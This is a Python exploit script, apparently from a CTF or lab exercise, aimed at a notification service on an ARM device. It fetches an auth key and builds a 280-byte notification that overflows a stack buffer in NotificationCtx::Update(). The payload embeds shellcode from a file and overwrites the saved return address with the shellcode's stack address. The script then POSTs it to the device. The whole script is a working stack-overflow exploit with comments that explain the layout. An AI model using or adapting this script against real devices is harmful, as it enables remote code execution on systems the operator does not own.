#!/usr/bin/env python3
from __future__ import print_function
from sys import argv, stderr
import os
import requests
import struct

SERVER_ADDR = "192.168.1.1:8000"
# value of 'sp' register at the very beginning of NotificationCtx::Update(),
# before 'push {r4, r5, r6, r7, pc}' instruction,
# ie start address of stack frame of NotificationCtx::Update()
STACK_FRAME_START = 0x2000DE00

url = 'http://%s/auth' % (SERVER_ADDR)
r = requests.get(url)
if r.status_code != 200:
    exit(1)
authKey = struct.unpack('I', r.content)[0]

url = 'http://%s/notification?auth=%x' % (SERVER_ADDR, authKey)

username = "Evil"
message = "Hi! "
# size of stack frame of NotificationCtx::Update() is exact 280 bytes.
# NotificationCtx::Update() stores notification in the buffer on stack,
# its address is STACK_FRAME_START - 280, ie end of stack frame.
# So below we build notification like this:
#
# |    4    | 'Evil' |   268   | 'Hi! ' |    0   | shell code | padding | return address |
#   4 bytes   4bytes   4 bytes   4bytes   4 bytes    N bytes    M bytes      4 bytes
# | <--                              280 bytes                                       --> |
desiredLen = 280

# build notification
notification = struct.pack('I', len(username))
notification += bytes(username, 'utf-8')
notification += struct.pack('I', desiredLen - 12)
notification += bytes(message, 'utf-8')
if len(notification) != 16:
    print("Wrong length")
    exit(1)

# add terminal zero to message string
notification += b'\x00' * 4

shell_offset = len(notification)

# append shell code
shell = open("shell.bin", 'rb').read()
notification += shell

# padding
notification += b'\x00' * (desiredLen - len(notification) - 4)
# last 4 bytes of our notifcation - address of shell code, this address
# will be written to 'pc' register during 'pop {r4, r5, r6, r7, pc}' instruction
# at the end of NotificationCtx::Update()
shell_addr = STACK_FRAME_START - (desiredLen - shell_offset) + 1
notification += struct.pack('I', shell_addr)
if len(notification) != desiredLen:
    print("Wrong length")
    exit(1)

requests.post(url=url, data=notification, headers={'Content-Type': 'application/octet-stream'})